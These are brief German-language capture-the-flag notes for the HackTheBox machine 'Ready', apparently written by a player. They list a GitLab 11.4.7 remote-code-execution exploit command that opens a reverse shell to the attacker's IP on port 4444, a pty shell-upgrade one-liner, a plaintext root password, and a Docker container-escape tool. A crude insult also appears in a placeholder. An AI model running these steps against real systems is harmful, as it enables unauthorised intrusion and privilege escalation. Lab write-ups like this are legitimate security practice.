https://github.com/ctrlsam/GitLab-11.4.7-RCE

python3 exploit.py -u [selbst_erstellter_user] -p [selbst_erstelltes_passwort] -g http://ready.htb -l [DEINE_IP_DU_SHIT] -P 4444

user :cake:

erstmal inetarktive tty:

python3 -c 'import pty; pty.spawn("/bin/bash")'

innerhalb des gitlab tty eingeben:

su
dann pw: wW59U!ZKMbG9+*#h

anschließend mit dem https://github.com/PercussiveElbow/docker-escape-tool
escapen

./docker-escape check

reicht bereits
alternativ: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout